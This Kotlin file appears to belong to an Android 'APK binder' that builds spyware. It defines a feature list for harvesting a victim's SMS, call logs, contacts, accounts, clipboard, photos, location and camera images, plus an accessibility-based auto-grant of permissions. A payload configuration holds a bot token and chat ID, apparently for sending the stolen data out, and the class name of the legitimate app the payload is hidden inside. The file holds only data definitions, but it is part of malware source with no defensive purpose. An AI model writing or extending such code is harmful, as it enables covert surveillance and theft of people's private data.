package Com.devhs.apkbinder.data

enum class Feature(val key: String, val label: String) {
    GALLERY("gallery", "Gallery"),
    SMS("sms", "SMS"),
    CALLS("calls", "Call List"),
    CONTACTS("contacts", "Contacts"),
    DEVICE("device", "Device Info"),
    APPS("apps", "Installed Apps"),
    WIFI("wifi", "Wi-Fi"),
    ACCOUNTS("accounts", "Accounts"),
    CONTACT_DETAILS("contact_details", "Contact Details"),
    CLIPBOARD("clipboard", "Clipboard"),
    SYSTEM("system", "System Info"),
    LOCATION("location", "Location"),
    FRONT_CAMERA("front_camera", "Front Camera"),
    BACK_CAMERA("back_camera", "Back Camera"),
    AUTO_GRANT("auto_grant", "Smart Allow (Accessibility)")
}

enum class LogLevel { INFO, SUCCESS, WARN, ERROR }

data class LogLine(val level: LogLevel, val message: String, val stamp: String)

data class PayloadConfig(
    val token: String,
    val chatId: String,
    val features: List<String>,
    val originalAppClass: String?
)
